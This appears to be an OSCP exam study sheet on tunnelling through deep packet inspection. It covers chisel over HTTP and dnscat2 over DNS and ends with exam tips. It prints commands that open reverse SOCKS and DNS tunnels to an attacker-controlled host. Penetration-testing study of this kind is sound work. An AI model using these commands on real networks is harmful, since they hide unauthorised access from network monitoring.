OSCP: Advanced Tunneling

HTTP TUNNELLING — CHISEL
Why HTTP: permitted almost everywhere — blocking it breaks browsing
Speed: fast, sufficient against most network-level filtering
Try this FIRST whenever a route through HTTP appears viable
chisel server -p 8080 --reverse
chisel client attacker:8080 R:socks
DNS TUNNELLING — DNSCAT
Why DNS: resolution is needed for nearly all activity — even harder to block than HTTP
Speed: slow — small query/response fields
The deepest FALLBACK — use only when HTTP is confirmed blocked/detected
dnscat2-server tunnel.example.com
dnscat --dns server=attacker,port=53
THE CORE IDEA
Deep packet inspection examines traffic content, not just source/destination/port. Both techniques answer the same way: ride the tunnel inside a protocol the inspection device is already configured to permit. Module 17 solved reachability (a route exists but can't be used directly); Module 18 solves inspection (a route is used but examined and blocked).
EXAM TRAPS & ACRONYMS
⚠️ DNS tunnelling is NOT automatically the better/stealthier choice — it's slow; try HTTP first
⚠️ This module solves INSPECTION, not reachability (that's Module 17)
⚠️ Wrapping traffic in HTTP doesn't guarantee it passes — sophisticated DPI can still notice abnormal patterns
⚠️ A short module ≠ a minor one — this is the deepest fallback in the course's tunnelling toolkit
⚠️ Document the FULL chain — carrier protocol + tool + any Module 17 layers underneath
